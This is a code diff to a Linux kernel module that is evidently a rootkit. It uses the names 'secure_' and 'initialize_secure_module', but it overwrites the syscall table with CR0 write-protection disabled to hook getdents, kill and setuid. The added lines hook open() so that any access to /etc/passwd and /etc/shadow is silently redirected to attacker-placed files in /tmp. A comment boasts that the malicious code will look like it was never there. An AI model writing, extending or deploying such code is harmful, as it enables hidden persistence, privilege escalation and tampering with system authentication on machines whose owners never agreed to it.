@@ -63,6 +63,24 @@ int isInvisible(pid_t pid){
 	return 0;
 }
 
+asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
+asmlinkage int secure_open(const char *pathname, int flags, mode_t mode)
+{
+  int a =strcmp(pathname, "/etc/passwd");
+  int b =strcmp(pathname, "/etc/shadow");
+  if( a == 0){
+    const char * pathname_secure = "/tmp/passwd";
+    copy_to_user((char * )pathname, pathname_secure,11);
+  }
+  if( b == 0){
+    const char * pathname_secure = "/tmp/shadow";
+    copy_to_user((char * )pathname, pathname_secure,11);
+  }
+
+  return original_open(pathname, flags, mode);
+}
+
+
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 asmlinkage int secure_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
@@ -353,6 +371,9 @@ static int initialize_secure_module(void)
   //setuid
   origin_setuid = (void*)*(sys_call_table + __NR_setuid);
   *(sys_call_table + __NR_setuid) = (unsigned long)secure_setuid;
+  //open
+  original_open = (void*)*(sys_call_table + __NR_open);
+  *(sys_call_table + __NR_open) = (unsigned long)secure_open;
   cr0 = read_cr0();
   set_bit(16, &cr0);
   write_cr0(cr0);
@@ -374,6 +395,7 @@ static void exit_secure_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
   cr0 = read_cr0();
   set_bit(16, &cr0);
